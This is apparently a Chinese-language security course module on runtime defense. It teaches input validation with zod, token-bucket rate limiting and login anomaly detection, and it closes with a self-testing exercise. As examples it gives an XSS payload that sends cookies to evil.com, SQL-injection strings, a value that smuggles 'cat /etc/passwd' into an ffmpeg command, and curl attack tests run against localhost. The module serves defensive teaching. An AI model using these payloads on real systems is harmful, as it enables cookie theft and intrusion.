---
name: 客座教学模块 — 运行时防御
讲师: 周富贵 (千问 Qwen3-Max)
module: 03 / 03
targetLevel: L2 实验级
estimatedTime: 3h
prerequisites: zhou-security-01.md（安全基线）, zhou-security-02.md（自动化扫描与CI）
---

# 模块3：运行时防御 — 你的服务不止要写对，还要扛打

## 学习目标

完成本模块后，你能够：
1. 识别并修复代码中的注入漏洞（SQL注入 / XSS / 命令注入）
2. 为 API 端点编写输入验证 schema（zod），区分"合法输入"和"攻击载荷"
3. 实现 API 速率限制（token bucket），防止暴力破解和资源滥用
4. 理解运行时异常的检测思路并实现基础的登录异常告警
5. 在项目中部署三层运行时防护：输入验证 + 速率限制 + 异常检测

## 前置知识

- 完成了安全模块01（三条基线 + 手工扫描）
- 完成了安全模块02（pre-commit hook + CI 集成）
- 基本理解 HTTP 请求/响应模型
- 了解 Node.js + TypeScript 基础

## 为什么模块01、02不够

模块01教你写代码时不泄露密钥。模块02教你在提交前拦截危险代码。这两层都是在代码**运行之前**设防。

但攻击者不关心你的 pre-commit hook。他们直接打你的线上服务。

**三层防御全景**：

```
模块01 (编写时)      模块02 (提交时)      模块03 (运行时)
    ↓                    ↓                    ↓
  不写漏洞             不提交漏洞            扛住攻击
```

一个真实的故事：2025年某AI创业公司的 API 网关没有做速率限制。攻击者用100个IP、每秒10万次请求打他们的 `/api/chat` 端点，一夜之间烧掉了 $47,000 的 API 调用费用。他们有 pre-commit hook，有 CI 扫描——但运行时防线是空的。

**本模块的目标：让你的服务不止写对，还要扛打。**

## 核心概念

### 运行时防御的三道闸门

```
请求到达
  │
  ├─ 闸门1: 输入验证 — 你发的东西合法吗？
  │    └─ 不合法 → 400 Bad Request（0.1ms 内拒绝）
  │
  ├─ 闸门2: 速率限制 — 你发得太快了吗？
  │    └─ 太快 → 429 Too Many Requests（不消耗业务资源）
  │
  └─ 闸门3: 异常检测 — 你的行为正常吗？
       └─ 异常 → 告警 + 延迟响应（不直接拒绝，但标记风险）
```

**原则1：早拒绝，低成本** — 在闸门1拒绝一个恶意请求的成本是 0.1ms CPU。在业务逻辑层处理它的成本可能是 100ms + 一次数据库查询 + 一次 AI 调用。

**原则2：正常用户不受影响** — 安全机制不能劣化正常用户的体验。输入验证不能拒绝合法输入；速率限制不能影响正常使用频率；异常检测不能把误登录的用户锁死。

**原则3：渐进响应** — 不要一发现异常就直接封 IP。先限制、再验证、再延迟、最后才阻断。给真实用户留纠正空间（比如输错密码3次后加验证码，而不是直接封号）。

---

### 闸门1：输入验证

#### 为什么需要输入验证

所有安全漏洞的根本原因都是同一个：**信任了不该信任的输入**。

```
用户输入 → 你的代码 → 数据库 / Shell / HTML / AI Prompt
   ↑                                              ↑
  攻击者在这里放恶意数据              在这里造成破坏
```

输入验证在两个层面工作：
1. **结构验证**：数据的类型和格式对不对（是字符串还是数组？是email还是随机文本？）
2. **语义验证**：数据的含义在当前上下文中合不合理（age=150 虽然是个合法整数，但不合理）

#### 输入验证 vs 转义消毒

| 方式 | 做什么 | 什么时候用 | 局限 |
|------|--------|-----------|------|
| 验证 (Validate) | 检查数据是否合规，不合规就拒绝 | API 入口、表单提交 | 只知道"是否合法"，不知道恶意程度 |
| 转义 (Sanitize) | 把特殊字符转成安全的等价形式 | 输出到 HTML、拼接 SQL 前 | 改写了数据，可能影响业务逻辑 |
| 参数化 (Parameterize) | 把数据和指令分开传，永不混合 | SQL 查询、Shell 命令、Prompt 拼接 | 需要框架支持 |

**铁律：永远不要用转义替代验证。先验证，再考虑是否需要转义。**

#### SQL 注入：最经典的运行时漏洞

```typescript
// ❌ 错误：字符串拼接 SQL（攻击者输入 ' OR '1'='1 即可绕过）
app.get('/api/user', async (req, res) => {
  const { username } = req.query;
  const user = await db.query(
    `SELECT * FROM users WHERE username = '${username}'`
  );
  // 攻击载荷: username = "' OR '1'='1' --"
  // 实际执行: SELECT * FROM users WHERE username = '' OR '1'='1' --'
  // 结果: 返回所有用户
});

// ✅ 正确：参数化查询
app.get('/api/user', async (req, res) => {
  const { username } = req.query;
  const user = await db.query(
    'SELECT * FROM users WHERE username = ?',
    [username]  // 驱动自动转义，username 永远是数据不是指令
  );
});
```

**为什么参数化比"手动转义引号"更安全？**
手动转义 `'` → `\'` 看似解决了问题，但攻击者可以用其他编码绕过（Unicode 变体、双编码、宽字节注入）。参数化把"指令"和"数据"在协议层分开，从根本上消除了注入可能。

#### XSS（跨站脚本）：把恶意脚本注入到你的页面

```typescript
// ❌ 错误：直接拼接用户输入到 HTML
app.get('/search', (req, res) => {
  const { q } = req.query;
  res.send(`<h1>搜索结果: ${q}</h1>`);
  // 攻击载荷: q = "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
  // 结果: 所有访问这个页面的用户 cookie 被窃取
});

// ✅ 正确1：转义 HTML 特殊字符
function escapeHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// ✅ 正确2（最佳）：使用模板引擎的自动转义
// React: JSX 默认转义 — <div>{userInput}</div> 是安全的
// Next.js: dangerouslySetInnerHTML 明确标注了"这是危险的"
```

#### 命令注入：别把用户输入传给 Shell

```typescript
// ❌ 错误：exec 拼接用户输入
app.post('/api/convert', (req, res) => {
  const { filename } = req.body;
  exec(`ffmpeg -i uploads/${filename} output.mp4`, (err) => {
    // 攻击载荷: filename = "a.mp4; cat /etc/passwd"
    // 实际执行: ffmpeg -i uploads/a.mp4; cat /etc/passwd output.mp4
  });
});

// ✅ 正确：使用 execFile 分离参数
import { execFile } from 'child_process';
app.post('/api/convert', (req, res) => {
  const { filename } = req.body;
  // 验证 filename 只包含安全字符
  if (!/^[a-zA-Z0-9_-]+\.mp4$/.test(filename)) {
    return res.status(400).json({ error: 'Invalid filename' });
  }
  execFile('ffmpeg', ['-i', `uploads/${filename}`, 'output.mp4']);
  // execFile 直接把参数传给进程，不经过 shell 解析
});
```

#### 用 Zod 建立输入验证 Schema（实战）

```typescript
import { z } from 'zod';

// 用户注册 Schema
const RegisterSchema = z.object({
  username: z.string()
    .min(3, '用户名至少3个字符')
    .max(30)
    .regex(/^[a-zA-Z0-9_]+$/, '用户名只能包含字母数字和下划线'),
  email: z.string()
    .email('邮箱格式不正确')
    .max(254),  // RFC 5321 限制
  password: z.string()
    .min(12, '密码至少12个字符')
    .max(128)
    .regex(/[A-Z]/, '必须包含大写字母')
    .regex(/[a-z]/, '必须包含小写字母')
    .regex(/[0-9]/, '必须包含数字')
    .regex(/[^A-Za-z0-9]/, '必须包含特殊字符'),
  age: z.number()
    .int()
    .min(13, '必须年满13岁')
    .max(150, '请输入有效年龄')
    .optional(),
  referralCode: z.string()
    .length(8)
    .regex(/^[A-Z0-9]+$/)
    .optional(),
});

// API 中使用
app.post('/api/register', async (req, res) => {
  const result = RegisterSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({
      error: '输入验证失败',
      details: result.error.issues.map(i => ({
        field: i.path.join('.'),
        message: i.message,
      })),
    });
  }
  // TypeScript 类型推断: result.data 的类型是 RegisterSchema 定义的精确类型
  const user = await createUser(result.data);
  return res.json({ id: user.id });
});
```

**Schema 验证的五个原则**：
1. **白名单优于黑名单** — 定义"什么是合法的"（`/^[a-zA-Z0-9_]+$/`）而不是"什么不允许"
2. **最小长度和最大长度都要限制** — 防止空值和超长值溢出
3. **正则要精确** — `/^[a-zA-Z0-9_]+$/` 用了 `^` 和 `$` 锚定，防止部分匹配绕过
4. **类型要严格** — `z.number().int()` 不接受 `"42"` 这种字符串
5. **错误信息要具体但不泄露内部信息** — "密码至少12个字符" 好；"密码不符合 /^(?=.*[A-Z].../" 不好（暴露了正则，帮助攻击者反向构造）

---

### 闸门2：速率限制

#### 为什么输入验证不够

输入验证只能判断"单次请求是否合法"，不能判断"请求频率是否正常"。

攻击者可以发送完全合法的请求（每个请求格式都正确、参数都通过 schema 验证），但频率异常高——暴力破解密码、爬取数据、刷空 API 额度。

速率限制回答的问题是：**你在单位时间内可以做多少次操作？**

#### 三种速率限制策略

| 策略 | 原理 | 适用场景 | 优缺点 |
|------|------|---------|--------|
| 固定窗口 | 计数器在每个固定时间段（如每分钟）重置 | 简单 API、非关键端点 | 实现简单，但窗口边界有突刺（最后1秒+新窗口第1秒=2倍流量） |
| 滑动窗口 | 记录每次请求时间戳，数最近 N 秒内的请求数 | 需要平滑限流的关键 API | 精确，但存储开销较大 |
| Token Bucket | 令牌以恒定速率填充，每次请求消耗一个令牌 | 允许短时突发但限制平均速率 | 用户体验好（允许自然的突发），实现简单 |

**推荐首选 Token Bucket**：它在用户体验和防护效果之间平衡最好。正常用户偶尔会连续点击（突发），但攻击者会持续高频请求（填不满令牌桶）。

#### Token Bucket 实现

```typescript
// lib/rate-limiter.ts — 内存版 Token Bucket（生产可用 Redis 替代）
interface Bucket {
  tokens: number;
  lastRefill: number;
}

class TokenBucketRateLimiter {
  private buckets = new Map<string, Bucket>();
  private capacity: number;    // 桶容量（允许的最大突发）
  private refillRate: number;  // 每秒填充多少个令牌
  private refillInterval: number; // 填充间隔（ms）

  constructor(capacity: number, refillPerSecond: number) {
    this.capacity = capacity;
    this.refillRate = refillPerSecond;
    this.refillInterval = 100; // 每 100ms 填充一次
  }

  consume(key: string, tokens: number = 1): { allowed: boolean; remaining: number } {
    const now = Date.now();
    let bucket = this.buckets.get(key);

    if (!bucket) {
      bucket = { tokens: this.capacity, lastRefill: now };
      this.buckets.set(key, bucket);
    }

    // 填充令牌
    const elapsed = now - bucket.lastRefill;
    const tokensToAdd = (elapsed / 1000) * this.refillRate;
    bucket.tokens = Math.min(this.capacity, bucket.tokens + tokensToAdd);
    bucket.lastRefill = now;

    // 消费
    if (bucket.tokens >= tokens) {
      bucket.tokens -= tokens;
      return { allowed: true, remaining: Math.floor(bucket.tokens) };
    }

    return { allowed: false, remaining: Math.floor(bucket.tokens) };
  }

  // 定期清理空闲桶（每5分钟调用一次，防止内存泄漏）
  cleanup(maxIdleMs: number = 300_000) {
    const now = Date.now();
    for (const [key, bucket] of this.buckets) {
      if (now - bucket.lastRefill > maxIdleMs) {
        this.buckets.delete(key);
      }
    }
  }
}

// ─── 按端点分级限流 ───
const limiters = {
  login:    new TokenBucketRateLimiter(5, 1),    // 容量5, 每秒1个 — 登录要严格限制
  api:      new TokenBucketRateLimiter(60, 10),   // 容量60, 每秒10个 — 普通API
  health:   new TokenBucketRateLimiter(10, 2),    // 健康检查也要限（防止被利用做反射放大）
};

// Express 中间件
function rateLimit(
  limiter: TokenBucketRateLimiter,
  keyFn: (req: Request) => string = (req) => req.ip
) {
  return (req: Request, res: Response, next: NextFunction) => {
    const key = keyFn(req);
    const result = limiter.consume(key);

    res.setHeader('X-RateLimit-Remaining', result.remaining);

    if (!result.allowed) {
      return res.status(429).json({
        error: '请求过于频繁，请稍后再试',
        retryAfter: Math.ceil(result.remaining / limiter['refillRate']),
      });
    }
    next();
  };
}

// 使用
app.post('/api/login', rateLimit(limiters.login), loginHandler);
app.use('/api', rateLimit(limiters.api));
```

#### 速率限制的关键决策

| 决策点 | 建议 | 原因 |
|--------|------|------|
| 限流 key 用什么 | IP + 端点（login:192.168.1.1） | 仅用 IP 会导致一个用户的所有操作共享配额 |
| 登录端点限制多少 | 5次/秒/IP, 或 20次/分钟/IP | 正常用户1秒内不可能登录5次 |
| 被限后返回什么 HTTP 状态码 | 429 Too Many Requests | 不要用 403（会误导为权限问题） |
| 被限用户看到什么 | `{"error":"请求过于频繁","retryAfter":3}` | 给具体等待时间，不要只是"你太快了" |
| 是否对 CDN/代理 IP 特殊处理 | 从 `X-Forwarded-For` 取真实 IP | 否则所有用户共享代理 IP=一个人用完配额全部被限 |

---

### 闸门3：异常检测

#### 为什么输入验证和速率限制都不够

闸门1和闸门2是**规则驱动的**——你知道攻击长什么样，提前写好规则。

但攻击者会不断改变手法。有些攻击在单个请求和短期内完全合法——比如用偷来的 cookie 冒充正常用户、用低频率调用敏感接口、用不同 IP 轮流尝试登录（绕过了单一 IP 的速率限制）。

异常检测回答的问题是：**这个行为跟正常模式相比，有多不对劲？**

异常检测不追求"拦截"，追求"发现"——发现了异常后，后续动作可以是告警、延迟响应、要求二次验证、或记录到审计日志。

#### 登录异常检测：最实用的入口

登录是最容易检测异常的场景，因为正常用户和攻击者的登录模式差异巨大。

```typescript
// lib/anomaly-detector.ts — 登录异常检测
interface LoginAttempt {
  username: string;
  ip: string;
  userAgent: string;
  timestamp: number;
  success: boolean;
}

interface LoginAnomaly {
  type: 'brute_force' | 'credential_stuffing' | 'geo_anomaly' | 'new_device';
  severity: 'low' | 'medium' | 'high';
  detail: string;
  triggeredAt: number;
}

class LoginAnomalyDetector {
  private attempts: LoginAttempt[] = [];
  private userLoginMap = new Map<string, LoginAttempt[]>();  // username → attempts
  private ipLoginMap = new Map<string, LoginAttempt[]>();    // ip → attempts
  private readonly MAX_ATTEMPTS = 10_000;

  recordAttempt(attempt: LoginAttempt): LoginAnomaly[] {
    const anomalies: LoginAnomaly[] = [];
    const now = attempt.timestamp;

    // 存储
    this.attempts.push(attempt);
    if (this.attempts.length > this.MAX_ATTEMPTS) this.attempts.shift();

    const userKey = attempt.username;
    const ipKey = attempt.ip;
    if (!this.userLoginMap.has(userKey)) this.userLoginMap.set(userKey, []);
    if (!this.ipLoginMap.has(ipKey)) this.ipLoginMap.set(ipKey, []);
    this.userLoginMap.get(userKey)!.push(attempt);
    this.ipLoginMap.get(ipKey)!.push(attempt);

    // ─── 检测1: 暴力破解 — 同一用户名短时间内大量失败 ───
    const userRecentFails = this.userLoginMap.get(userKey)!
      .filter(a => !a.success && now - a.timestamp < 300_000); // 5分钟内
    if (userRecentFails.length >= 10) {
      anomalies.push({
        type: 'brute_force',
        severity: 'high',
        detail: `用户 ${userKey} 在5分钟内失败 ${userRecentFails.length} 次`,
        triggeredAt: now,
      });
    }

    // ─── 检测2: 撞库 — 同一IP用不同用户名尝试登录 ───
    const ipRecentUsernames = new Set(
      this.ipLoginMap.get(ipKey)!
        .filter(a => now - a.timestamp < 300_000)
        .map(a => a.username)
    );
    if (ipRecentUsernames.size >= 20) {
      anomalies.push({
        type: 'credential_stuffing',
        severity: 'high',
        detail: `IP ${ipKey} 在5分钟内尝试了 ${ipRecentUsernames.size} 个不同用户名`,
        triggeredAt: now,
      });
    }

    // ─── 检测3: 新设备登录 — 同一用户换了 User-Agent ───
    const userHistory = this.userLoginMap.get(userKey)!;
    if (attempt.success && userHistory.length > 1) {
      const knownAgents = new Set(
        userHistory.slice(0, -1).filter(a => a.success).map(a => a.userAgent)
      );
      if (knownAgents.size > 0 && !knownAgents.has(attempt.userAgent)) {
        anomalies.push({
          type: 'new_device',
          severity: 'medium',
          detail: `用户 ${userKey} 从新设备/浏览器登录`,
          triggeredAt: now,
        });
      }
    }

    // ─── 检测4: 异地登录 — 短时间内从不同IP登录（简化版） ───
    const userRecentSuccess = userHistory.filter(
      a => a.success && now - a.timestamp < 600_000
    );
    const recentIPs = new Set(userRecentSuccess.map(a => a.ip));
    if (recentIPs.size >= 3) {
      anomalies.push({
        type: 'geo_anomaly',
        severity: 'medium',
        detail: `用户 ${userKey} 在10分钟内从 ${recentIPs.size} 个不同IP登录`,
        triggeredAt: now,
      });
    }

    return anomalies;
  }
}

// 使用示例
const detector = new LoginAnomalyDetector();

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const success = await verifyPassword(username, password);

  const anomalies = detector.recordAttempt({
    username,
    ip: req.ip,
    userAgent: req.headers['user-agent'] || 'unknown',
    timestamp: Date.now(),
    success,
  });

  // 根据异常严重性采取不同响应
  for (const a of anomalies) {
    console.warn(`[安全告警] ${a.type} (${a.severity}): ${a.detail}`);
    if (a.type === 'brute_force' && a.severity === 'high') {
      // 触发额外保护：需要验证码或延迟响应
      await sleep(2000); // 延迟2秒响应，拖慢攻击节奏
    }
  }

  if (!success) {
    return res.status(401).json({ error: '用户名或密码错误' });
  }
  // ... 正常登录流程
});
```

**异常检测的三个要点**：
1. **检测 ≠ 阻断** — 本模块的异常检测只告警和延迟，不主动封禁。封禁决策需要人工或更成熟的规则引擎
2. **阈值需要数据校准** — 上线第一周只记录，不告警。积累一周正常数据后，设置阈值为 `均值 + 3σ`
3. **生产环境用 Redis** — 内存存储在进程重启后丢失。生产环境用 Redis 的 Sorted Set 存储时间序列

---

## 练习

### 练习1：编写 Zod 输入验证 Schema（30分钟）

为以下三个 API 端点编写完整的 Zod Schema：

**端点1 — 用户反馈提交**：
```typescript
// POST /api/feedback
// 用户提交对AI回复的满意度反馈
interface FeedbackInput {
  messageId: string;    // AI消息ID, UUID格式
  rating: number;       // 1-5 评分
  comment?: string;     // 可选文字评价, ≤500字
  category?: string;    // 可选分类, 只能是 "helpful" | "not_helpful" | "harmful"
}
```

**端点2 — 邀请码兑换**：
```typescript
// POST /api/redeem
// 用户输入邀请码获取权益
interface RedeemInput {
  code: string;         // 邀请码, 8位大写字母数字
  phone?: string;       // 可选手机号, 中国大陆格式
  agreement: boolean;   // 必须为 true（同意条款）
}
```

**端点3 — 搜索接口**：
```typescript
// GET /api/search
// 搜索用户的笔记内容
interface SearchInput {
  q: string;            // 搜索关键词, 1-100字符
  page?: number;        // 页码, ≥1
  pageSize?: number;    // 每页条数, 1-50
  sort?: string;        // 排序方式, "relevance" | "date"
}
```

**要求**：
1. 每个端点写出完整的 Zod Schema 定义
2. 对每个字段的约束条件写上注释说明为什么选这个约束
3. 写出至少2个"应该被拒绝的恶意输入"示例（每个端点）
4. 验证你的 schema 能否正确拒绝这些恶意输入（用 `safeParse` 自测）

### 练习2：实现 Token Bucket 速率限制器（40分钟）

实现一个 Token Bucket 速率限制器并在 Express 中使用。

**步骤1**：完成上面核心概念中的 `TokenBucketRateLimiter` 类（可以直接用上面的代码，但必须理解每一行）。

**步骤2**：为以下三个端点设置不同的限流策略，并说明为什么选择这个参数：
- `POST /api/login` — 登录接口
- `GET /api/health` — 健康检查
- `POST /api/generate` — AI 文本生成（这个是按量计费的）

**步骤3**：编写一个简单的测试脚本，模拟以下场景：
```bash
# 场景A: 正常用户 — 每2秒请求一次，请求10次（应该全部放行）
# 场景B: 脚本攻击 — 连续快速请求20次（应该大部分被429拒绝）
# 场景C: 分布式攻击 — 用5个不同IP各请求5次（每个IP应该还有剩余额度）
```

**要求**：
- 用 `curl` 或 Node.js 脚本模拟三种场景
- 记录每次请求的 HTTP 状态码和 `X-RateLimit-Remaining` 响应头
- 验证场景A全部 200、场景B至少10次429、场景C全部 200
- 将输出截图或粘贴到笔记

### 练习3：端到端安全测试 — 攻击你的自己的服务（90分钟）

这是本模块的核心练习。你将扮演攻击者，对你（或团队其他成员）写的 API 进行端到端攻击测试。

**准备**：
启动掌心人格局的本地服务（或使用任意一个你参与的 API 服务）。

**测试清单**：

**A. SQL注入测试（10分钟）**
```bash
# 对每个接受用户输入的端点尝试
curl "http://localhost:3000/api/xxx?q='%20OR%20'1'='1"
curl "http://localhost:3000/api/xxx?q=1'%3B%20DROP%20TABLE%20users%3B--"
curl "http://localhost:3000/api/xxx?q=1%20UNION%20SELECT%20*%20FROM%20users"
```
记录哪些端点返回了数据库错误（说明可能存在注入）、哪些正确返回了400（说明输入验证在工作）。

**B. XSS测试（10分钟）**
```bash
# 对接受文本输入的端点
curl -X POST "http://localhost:3000/api/xxx" \
  -H "Content-Type: application/json" \
  -d '{"text":"<script>alert(1)</script>"}'
curl -X POST "http://localhost:3000/api/xxx" \
  -H "Content-Type: application/json" \
  -d '{"text":"<img src=x onerror=alert(1)>"}'
```
检查返回的 HTML 中是否包含未转义的 `<script>` 或 `onerror` 属性。

**C. 速率限制测试（15分钟）**
```bash
# 对登录或发送验证码的端点连续请求
for i in {1..30}; do
  curl -s -o /dev/null -w "%{http_code} " \
    "http://localhost:3000/api/login" \
    -X POST -H "Content-Type: application/json" \
    -d '{"username":"test","password":"wrong"}'
  sleep 0.1
done
```
记录第几次请求开始收到 429。

**D. 参数污染测试（10分钟）**
```bash
# 发送额外的参数、重复参数、畸形 JSON
curl "http://localhost:3000/api/xxx?a=1&a=2&a=3"  # 重复参数
curl -X POST "http://localhost:3000/api/xxx" \
  -H "Content-Type: application/json" \
  -d '{"name": "test", "name": "admin"}'  # 重复key
curl -X POST "http://localhost:3000/api/xxx" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'  # 原型污染
```

**E. 过载测试（25分钟）**
```bash
# 发送超大数据、超深嵌套、超长字符串
curl -X POST "http://localhost:3000/api/xxx" \
  -H "Content-Type: application/json" \
  -d "{\"text\":\"$(python3 -c 'print("A"*1000000)')\"}"  # 1MB 字符串

# 深度嵌套 JSON（1000层）
python3 -c "
import json
obj = {}
cur = obj
for i in range(1000):
    cur['nested'] = {}
    cur = cur['nested']
print(json.dumps({'data': obj}))
" | curl -X POST "http://localhost:3000/api/xxx" \
  -H "Content-Type: application/json" -d @-
```

**输出**：
编写测试报告 `student-notebook/zhou-security-runtime-test.md`，包含：
- 每个测试项的结果（通过/发现问题/需要改进）
- 发现的具体漏洞或安全隐患（至少1个"需要改进"的发现）
- 对每个发现的修复建议

**注意**：这五个测试中很可能会"发现"一些问题——这不是坏事。发现问题是安全测试的目的。关键是写出清楚的分析和可操作的修复建议。

## 验收标准

- [ ] 练习1：3个端点的 Zod Schema 完整且正确，每个端点有 ≥2个恶意输入示例
- [ ] 练习2：TokenBucketRateLimiter 实现正确，三种场景测试结果符合预期（200/429/200）
- [ ] 练习3：安全测试报告存在，覆盖A-E五种攻击向量
- [ ] 练习3的报告中至少有1个具体的"发现"（可以是正面结论，但必须有测试输出证据）
- [ ] 能用自己的话解释：为什么参数化查询比转义引号更安全
- [ ] 能用自己的话解释：Token Bucket 为什么比固定窗口更适合 API 限流

## 常见问题

**Q: 别人说"我们这个阶段不需要考虑运行时安全，先上线再说"，怎么回应？**
运行时安全的第一道闸门——输入验证——本身就是业务逻辑的一部分。一个没有输入验证的端点，不只是不安全，是根本不能正常工作（收到垃圾数据就崩溃）。把输入验证当作功能开发来做，不要另外立项。

**Q: Zod schema 写多了很重复，有没有更高效的方式？**
有。两种模式：
1. 定义公共片段复用：`const Password = z.string().min(12).max(128)` 然后在各处 `z.object({ password: Password })`
2. 从数据库 Schema 或 OpenAPI 文档自动生成（代码生成工具），目前阶段先手写，理解底层原理后再考虑自动化

**Q: 速率限制用内存存储，重启就丢了，生产能用吗？**
不能。本模块的 TokenBucketRateLimiter 是学习版（不到100行，理解原理）。生产环境必须用 Redis：`MULTI` + `DECR` + `EXPIRE` 原子操作。但算法逻辑完全相同——你学到的 token bucket 逻辑可以直接翻译到 Redis Lua 脚本。

**Q: 异常检测的值（5分钟10次失败、20个不同用户名）从哪来的？**
本模块给的阈值是教学示例，不是生产标准。正确的做法是：
1. 上线第一周只记录，不告警
2. 分析一周数据，取 P95 或 P99 值作为阈值
3. 每季度重新校准一次
4. 关键指标用 `均值 + 3σ` 而不是硬编码数字

**Q: 我按练习3测试了自己的服务，发现一堆问题，怎么办？**
这是正常的。安全测试不是为了证明"没有漏洞"（那不叫测试，叫自我安慰），而是为了发现漏洞。把发现的问题按优先级排：
- P0（严重）：能直接造成数据泄露或资金损失 → 立即修复
- P1（高危）：可能被利用但需要特定条件 → 本周内修复
- P2（中危）：防御深度不足 → 下个迭代修复
- P3（低危）：代码气味 → backlog

## 延伸阅读

- OWASP Input Validation Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
- Zod 官方文档: https://zod.dev
- Rate Limiting 模式（Cloudflare 博客）: https://blog.cloudflare.com/counting-things-a-lot-of-different-things/
- Redis 实现 Token Bucket: https://redis.io/glossary/rate-limiting/
- 企业级异常检测: https://www.splunk.com/en_us/blog/learn/anomaly-detection.html
- 本项目: `student-notebook/zhou-three-layer-defense.md` — 三层防线架构（本模块是L2运行时防御的具体实现）

---

*周富贵教学模块 03/03 | AI师生研究院 V7*
*审查日期: 2026-05-06*
